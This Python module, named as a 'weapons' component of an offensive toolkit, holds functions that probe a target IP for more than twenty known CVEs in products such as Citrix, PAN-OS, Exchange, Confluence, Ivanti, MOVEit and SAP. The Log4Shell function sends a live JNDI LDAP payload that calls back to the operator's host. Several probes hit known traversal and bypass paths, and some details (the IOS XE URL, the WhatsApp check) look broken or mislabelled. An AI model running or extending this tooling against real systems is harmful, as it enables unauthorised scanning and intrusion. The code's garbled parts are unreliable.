"""quantum.weapons.remote_v3 — V3_HIGH/MED remote-tier weapons."""
from __future__ import annotations

from quantum.core.deps import requests
from quantum.core.opsec import rand_hex, tcp_probe


def _wget(url, timeout=3, **kw):
    try:
        r = requests.get(url, timeout=timeout, verify=False, **kw)
        return {"status_code": r.status_code, "len": len(r.content or b""),
                "text": (r.text or "")[:120]}
    except Exception as exc:
        return {"error": str(exc)}


def v3_log4shell(ip, params=None):
    """CVE-2021-44228 Log4Shell — JNDI-carrying header probe."""
    from quantum.core.env import local_ip
    params = params or {}
    port = params.get("http_port", 8080)
    try:
        r = requests.get(f"http://{ip}:{port}/", timeout=3,
                         headers={"User-Agent": "${jndi:ldap://" + local_ip() + "/x}"})
        return {"cve": "CVE-2021-44228", "status": "probe",
                "http": r.status_code, "note": "OOB listener implied"}
    except Exception as exc:
        return {"cve": "CVE-2021-44228", "status": "no-service", "error": str(exc)}


def v3_citrixbleed(ip, params=None):
    """CVE-2023-4966 Citrix Bleed — session-token leak probe (64-hex)."""
    r = _wget(f"https://{ip}/vpn/{rand_hex(4)}.html", timeout=3)
    if isinstance(r, dict) and r.get("status_code") == 404:
        return {"cve": "CVE-2023-4966", "status": "probe", "http": 404}
    return {"cve": "CVE-2023-4966", "status": "check", "detail": r}


def v3_citrix_path(ip, params=None):
    """CVE-2019-19781 Citrix path traversal — newbm.pl staging probe."""
    r = _wget(f"http://{ip}/vpn/../vpns/portal/", timeout=3)
    return {"cve": "CVE-2019-19781", "status": "probe", "detail": r}


def v3_panos_cmd(ip, params=None):
    """CVE-2024-3400 PAN-OS GlobalProtect — traversal injection probe."""
    r = _wget(f"https://{ip}/global-protect/portal/", timeout=3)
    return {"cve": "CVE-2024-3400", "status": "probe", "detail": r}


def v3_confluence_ognl(ip, params=None):
    """CVE-2022-26134 Confluence OGNL — URI-path exec probe."""
    try:
        r = requests.get(f"http://{ip}:8090/%24%7Bjndi%3Aldap%3A%2F%2Fx%7D/x",
                         timeout=3)
        return {"cve": "CVE-2022-26134", "status": "probe", "http": r.status_code}
    except Exception as exc:
        return {"cve": "CVE-2022-26134", "status": "no-service", "error": str(exc)}


def v3_weblogic_console(ip, params=None):
    """CVE-2020-14882 WebLogic console — traversal bypass probe."""
    r = _wget(f"http://{ip}:7001/console/%252e%252e%252e%252e%252e/"
              f"console.portal", timeout=3)
    return {"cve": "CVE-2020-14882", "status": "probe", "detail": r}


def v3_ios_admin(ip, params=None):
    """CVE-2023-20198 IOS XE — escaped-restconf admin probe."""
    r = _wget(f"https://{ip}%25252e%25252e%25252e/%%73how", timeout=3)
    return {"cve": "CVE-2023-20198", "status": "probe", "detail": r}


def v3_vcenter_upload(ip, params=None):
    """CVE-2021-21972 vCenter — vROps plugin upload probe."""
    r = _wget(f"https://{ip}/ui/vropspluginui/rest/services/checkdup",
              timeout=3)
    return {"cve": "CVE-2021-21972", "status": "probe", "detail": r}


def v3_moveit_probe(ip, params=None):
    """CVE-2023-34362 MOVEit — SQLi probe."""
    r = _wget(f"https://{ip}/moveitisapi/moveitisapi.dll?action=migrate_users",
              timeout=3)
    return {"cve": "CVE-2023-34362", "status": "probe", "detail": r}


def v3_sambacry(ip, params=None):
    """CVE-2017-7494 SambaCry — share-walk staging check."""
    open_ports = [p for p in (139, 445) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2017-7494", "status": "check",
            "smb": "open" if open_ports else "closed", "shares_walked": False}


def v3_proxyshell(ip, params=None):
    """CVE-2021-34473 ProxyShell — Exchange CAS autodiscover probe."""
    r = _wget(f"https://{ip}/autodiscover/autodiscover.json?a=x/acme..",
              timeout=3)
    return {"cve": "CVE-2021-34473", "status": "probe", "detail": r}


def v3_proxynotshell(ip, params=None):
    """CVE-2022-41040 ProxyNotShell — OWA rewrite probe."""
    r = _wget(f"https://{ip}/owa/../././owa/auth/logon.aspx", timeout=3)
    return {"cve": "CVE-2022-41040", "status": "probe", "detail": r}


def v3_forgerock(ip, params=None):
    """CVE-2021-35464 ForgeRock — AM template-injection probe."""
    try:
        r = requests.get(f"http://{ip}:8080/openam/oauth2/..;/..;/x",
                         timeout=3)
        return {"cve": "CVE-2021-35464", "status": "probe",
                "http": r.status_code}
    except Exception as exc:
        return {"cve": "CVE-2021-35464", "status": "no-service",
                "error": str(exc)}


def v3_spring4shell(ip, params=None):
    """CVE-2022-22965 Spring4Shell — classLoader probe marker."""
    try:
        r = requests.get(f"http://{ip}:8080/?class.module.classLoader.x=y",
                         timeout=3)
        return {"cve": "CVE-2022-22965", "status": "probe",
                "http": r.status_code}
    except Exception as exc:
        return {"cve": "CVE-2022-22965", "status": "no-service",
                "error": str(exc)}


def v3_whatsapp_libmultiple(ip, params=None):
    """CVE-2022-27492 WhatsApp libmultiple — client-port presence check."""
    open_ports = [p for p in (5222, 443) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2022-27492", "status": "check",
            "detail": "staging: crafted call via open ports",
            "ports": open_ports, "target": ip}


def v3_goanywhere(ip, params=None):
    """CVE-2023-0669 GoAnywhere — admin-console probe."""
    r = _wget(f"https://{ip}/goanywhere/portal", timeout=3)
    return {"cve": "CVE-2023-0669", "status": "probe", "detail": r}


def v3_papercut(ip, params=None):
    """CVE-2023-27350 PaperCut — setup-completed auth-bypass probe."""
    r = _wget(f"http://{ip}:9191/app?service=page/SetupCompleted", timeout=3)
    return {"cve": "CVE-2023-27350", "status": "probe", "detail": r}


def v3_ivanti_epmm(ip, params=None):
    """CVE-2023-35078 Ivanti EPMM — MIFS API traversal probe."""
    r = _wget(f"https://{ip}/mifs/aad/api/v2/..;/..;/x", timeout=3)
    return {"cve": "CVE-2023-35078", "status": "probe", "detail": r}


def v3_screenconnect(ip, params=None):
    """CVE-2024-1709 ScreenConnect — setup-wizard bypass probe."""
    r = _wget(f"https://{ip}/SetupWizard.aspx/SystemExtendProtection",
              timeout=3)
    return {"cve": "CVE-2024-1709", "status": "probe", "detail": r}


def v3_fortimanager(ip, params=None):
    """CVE-2024-47575 FortiManager — fgfmd missing-auth probe."""
    open_ports = [p for p in (541,) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2024-47575", "status": "probe",
            "fgfmd": "open" if open_ports else "closed"}


def v3_ivanti_connect(ip, params=None):
    """CVE-2025-0282 Ivanti Connect Secure — stack-BOF endpoint probe."""
    r = _wget(f"https://{ip}/api/v1/totp/user-backup-code", timeout=3)
    return {"cve": "CVE-2025-0282", "status": "probe", "detail": r}


def v3_sap_netweaver(ip, params=None):
    """CVE-2025-31324 SAP NetWeaver — Visual Composer upload probe."""
    r = _wget(f"http://{ip}:50000/irj/go/km/docs", timeout=3)
    return {"cve": "CVE-2025-31324", "status": "probe", "detail": r}


def v3_citrixbleed2(ip, params=None):
    """CVE-2025-5777 Citrix Bleed 2 — session-token leak probe."""
    r = _wget(f"https://{ip}/vpn/{rand_hex(4)}.html", timeout=3)
    return {"cve": "CVE-2025-5777", "status": "probe", "detail": r}


def v3_regresshion(ip, params=None):
    """CVE-2024-6387 regreSSHion — SSH banner race-window probe."""
    import socket
    try:
        s = socket.create_connection((ip, 22), timeout=3)
        s.settimeout(3)
        banner = s.recv(128).decode("utf-8", "ignore").strip()
        s.close()
        return {"cve": "CVE-2024-6387", "status": "probe", "banner": banner}
    except Exception as exc:
        return {"cve": "CVE-2024-6387", "status": "no-service",
                "error": str(exc)}


def v3_adb_tls(ip, params=None):
    """CVE-2026-0073 adbd TLS auth — wireless-ADB CNXN banner probe."""
    import socket
    import struct
    params = params or {}
    port = params.get("adb_port", 5555)
    try:
        s = socket.create_connection((ip, port), timeout=4)
        s.settimeout(4)
        banner = b"host::"
        s.sendall(struct.pack("<IIIIII", 0x4E584E43, 0x01000001,
                              256 * 1024, len(banner),
                              sum(banner) & 0xFFFFFFFF,
                              0x4E584E43 ^ 0xFFFFFFFF) + banner)
        data = s.recv(1024)
        s.close()
        return {"cve": "CVE-2026-0073", "status": "probe",
                "adb": "open", "banner": data.decode("utf-8", "ignore")[:80]}
    except Exception as exc:
        return {"cve": "CVE-2026-0073", "status": "no-service",
                "error": str(exc)}
